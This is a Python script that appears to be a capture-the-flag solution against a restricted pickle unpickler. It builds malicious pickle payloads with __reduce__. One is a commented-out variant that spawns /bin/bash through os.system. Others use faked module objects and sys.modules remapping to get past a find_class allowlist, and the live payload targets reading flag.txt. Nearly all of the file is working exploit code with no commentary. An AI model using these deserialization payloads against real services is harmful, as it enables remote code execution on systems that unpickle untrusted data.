import pickle, sys


# module = type(__builtins__)
# empty = module("empty")
# empty.empty = empty
# sys.modules["empty"] = empty

# class RCE:
#     def __reduce__(self):
#         cmd = 'import os; os.system("/bin/bash")'
#         return exec, (cmd,)
#
# s = pickle.dumps(RCE())
# print(s.hex())

#
class FakeMod(type(sys)):
    modules = {}

    def __init__(self, name):
        self.d = {}
        super().__init__(name)

    def __getattribute__(self, name):
        d = self()
        return d[name]

    def __call__(self):
        return object.__getattribute__(self, "d")

# def attr(s):
#     try:
#         mod, name = s.split(".")
#     except ValueError:
#         mod, name = s, s
#     if mod not in FakeMod.modules:
#         FakeMod.modules[mod] = FakeMod(mod)
#     d = FakeMod.modules[mod]()
#     if name not in d:
#         def f(): pass
#         f.__module__ = mod
#         f.__qualname__ = name
#         f.__name__ = name
#         d[name] = f
#     return d[name]
#
# def dumps(obj):
#     pickle.dumps = pickle._dumps
#     orig = sys.modules
#     sys.modules = FakeMod.modules
#     s = pickle.dumps(obj)
#     sys.modules = orig
#     return s
#
#
# def craft(func, *args, dict=None, list=None, items=None):
#     class X:
#         def __reduce__(self):
#             tup = func, tuple(args)
#             if dict or list or items:
#                 tup += dict, list, items
#             return tup
#     return X()
#

import sys
import os

# modules = sys.modules              # save sys.modules for later
# sys.modules['sys'] = sys.modules   # remap sys to sys.modules
# import sys
# modules['empty'] = os     # access os throug the remapped sys, and store it in sys.modules['sys']
# import empty
# empty.system('echo "it works!"')     # boom!


# c1 = craft(attr("empty.__setattr__"), "modules", {"system": attr("os.system")})
# c2 = craft(attr("os.system"), "cat ./flag.txt")
# obj = craft(attr("empty.system"), (c1, c2))

def attr():
    mod, name = 'empty', 'test'
    FakeMod.modules[mod] = FakeMod(mod)
    d = FakeMod.modules[mod]()
    def f(): pass
    f.__module__ = mod
    f.__qualname__ = name
    f.__name__ = name
    d[name] = f
    return d[name]


class X:
    def __reduce__(self):
        return attr(), ("cat ./flag.txt",)


s = pickle.dumps(X()).hex()
print(s)

del pickle, sys


import pickle
import io
import sys

# module = type(__builtins__)
# empty = module("empty")
# empty.empty = empty
# sys.modules["empty"] = empty


class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        print(module, name)
        if module == "empty" and name.count(".") <= 1:
            return super().find_class(module, name)
        raise pickle.UnpicklingError("e-legal")


lepickle = bytes.fromhex(s)
if len(lepickle) > 400:
    print("your pickle is too large for my taste >:(")
else:
    SafeUnpickler(io.BytesIO(lepickle)).load()
